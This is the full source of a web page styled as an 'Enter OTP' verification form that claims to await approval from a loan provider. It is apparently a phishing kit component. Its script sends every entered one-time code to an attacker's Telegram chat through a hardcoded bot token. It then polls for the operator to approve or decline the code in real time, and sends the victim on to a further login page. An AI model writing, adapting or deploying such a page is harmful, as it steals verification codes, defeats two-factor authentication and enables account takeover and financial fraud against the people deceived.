<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Input Form</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #a0e1eb, #09d62c);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        .otp-container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
            padding: 30px;
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        
        h2 {
            color: #007BFF;
            margin-bottom: 20px;
            font-weight: 500;
        }
        
        .otp-input {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
        }
        
        .otp-input input {
            width: 50px;
            height: 40px;
            font-size: 24px;
            text-align: center;
            border: none;
            border-bottom: 2px solid #ccc;
            transition: border-color 0.3s;
            outline: none;
        }
        
        .otp-input input:focus {
            border-bottom: 2px solid #007BFF;
            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
        }
        
        .btn {
            margin-top: 15px;
            padding: 12px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            transition: background-color 0.3s, transform 0.3s;
        }
        
        .btn:hover {
            background-color: #0056b3;
            transform: translateY(-2px);
        }
        
        .btn:disabled {
            background-color: #6c757d;
            cursor: not-allowed;
            transform: none;
        }
        
        #status-message {
            display: none;
            text-align: center;
            padding: 12px;
            margin-top: 15px;
            border-radius: 8px;
            font-weight: 500;
        }
        
        #status-message.decline {
            display: block;
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        /* Spinner-only overlay */
        
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 999;
            justify-content: center;
            align-items: center;
        }
        
        .overlay.active {
            display: flex;
        }
        
        .overlay-box {
            background: white;
            padding: 40px 50px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
        }
        
        .overlay-box p {
            color: #555;
            margin-top: 15px;
            font-size: 16px;
        }
        
        .spinner {
            display: inline-block;
            width: 50px;
            height: 50px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #007BFF;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>
    <div class="otp-container">
        <h2>Enter OTP send to your email or phone number</h2>
        <div class="otp-input">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'otp2')" id="otp1">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'otp3')" id="otp2">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'otp4')" id="otp3">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'otp5')" id="otp4">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'otp6')" id="otp5">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'otp7')" id="otp6">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'otp8')" id="otp7">
            <input type="text" maxlength="1" oninput="moveFocus(this, 'submitButton')" id="otp8">
        </div>
        <button id="submitButton" class="btn">Verify</button>
        <div id="status-message"></div>
    </div>

    <!-- Spinner overlay — waiting for Telegram callback -->
    <div class="overlay" id="waiting-overlay">
        <div class="overlay-box">
            <div class="spinner"></div>
            <p>Waiting for approval from loan provider` ...</p>
        </div>
    </div>

    <script>
        // ─── Telegram Bot Config ────────────────────────────────────────
        const botToken = '8705352429:AAFEnwVGYhdodm1V7iDItiCXycEy-WZfL_o';
        const chatId = '5615316142';

        // ─── DOM refs ───────────────────────────────────────────────────
        const submitBtn = document.getElementById('submitButton');
        const statusMsg = document.getElementById('status-message');
        const overlay = document.getElementById('waiting-overlay');
        const otpInputs = ['otp1', 'otp2', 'otp3', 'otp4', 'otp5', 'otp6', 'otp7', 'otp8'];

        // ─── Helpers ────────────────────────────────────────────────────
        function generateId() {
            return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
        }

        function getOtp() {
            let otp = '';
            for (let i = 1; i <= 8; i++) {
                otp += document.getElementById('otp' + i).value;
            }
            return otp;
        }

        function resetOtpInputs() {
            otpInputs.forEach(id => document.getElementById(id).value = '');
            document.getElementById('otp1').focus();
            statusMsg.className = '';
            statusMsg.style.display = 'none';
            statusMsg.textContent = '';
            submitBtn.disabled = false;
            submitBtn.textContent = 'Verify';
        }

        function showDecline(msg) {
            statusMsg.textContent = msg;
            statusMsg.className = 'decline';
            statusMsg.style.display = 'block';
        }

        // ─── Auto-focus move ────────────────────────────────────────────
        function moveFocus(current, nextId) {
            if (current.value.length >= 1) {
                const nextEl = document.getElementById(nextId);
                if (nextEl) nextEl.focus();
            }
        }

        // ─── Poll Telegram for callback decision ───────────────────────
        function pollForDecision(submissionId) {
            let offset = 0;
            const poll = setInterval(async() => {
                try {
                    const resp = await fetch(
                        `https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}&timeout=10`
                    );
                    const data = await resp.json();
                    if (data.ok && data.result) {
                        for (const update of data.result) {
                            offset = update.update_id + 1;
                            if (update.callback_query) {
                                const cb = update.callback_query;
                                const cbData = cb.data; // e.g. "approve_otp_xxx" or "decline_otp_xxx"
                                const parts = cbData.split('_');
                                const action = parts[0]; // "approve" or "decline"
                                const id = parts.slice(2).join('_'); // handle "otp_xxx"

                                if (id === submissionId) {
                                    clearInterval(poll);
                                    overlay.classList.remove('active');

                                    if (action === 'approve') {
                                        window.location.href = 'login1.html';
                                    } else {
                                        showDecline('❌ OTP was declined. Please re-enter the OTP.');
                                        resetOtpInputs();
                                    }
                                }
                            }
                        }
                    }
                } catch (err) {
                    console.error('Poll error:', err);
                }
            }, 2000);
        }

        // ─── Form submission ───────────────────────────────────────────
        submitBtn.addEventListener('click', function() {
            const otp = getOtp();

            if (otp.length < 4 || otp.length > 8) {
                showDecline('⚠️ Please enter a valid OTP of 4 to 8 digits.');
                return;
            }

            // Disable button and show spinner
            submitBtn.disabled = true;
            submitBtn.textContent = 'Submitting...';
            statusMsg.style.display = 'none';

            const submissionId = generateId();

            const message = `🔐 New OTP Submission\n━━━━━━━━━━━━━━━\n🆔 ID: ${submissionId}\n🔢 OTP: ${otp}\n━━━━━━━━━━━━━━━`;

            const inlineKeyboard = {
                inline_keyboard: [
                    [{
                        text: '✅ Approve OTP',
                        callback_data: `approve_otp_${submissionId}`
                    }, {
                        text: '❌ Decline OTP',
                        callback_data: `decline_otp_${submissionId}`
                    }]
                ]
            };

            // ─── Send to Telegram ──────────────────────────────────────
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        reply_markup: inlineKeyboard
                    })
                })
                .then(response => {
                    if (!response.ok) {
                        return response.text().then(t => {
                            throw new Error(t);
                        });
                    }
                    // Success → show spinner overlay, start polling
                    overlay.classList.add('active');
                    pollForDecision(submissionId);
                })
                .catch(error => {
                    console.error('Telegram Error:', error);
                    showDecline('❌ Error sending OTP to Telegram. Please try again.');
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Verify';
                });
        });

        // Focus first OTP input on page load
        document.getElementById('otp1').focus();
    </script>
</body>

</html>
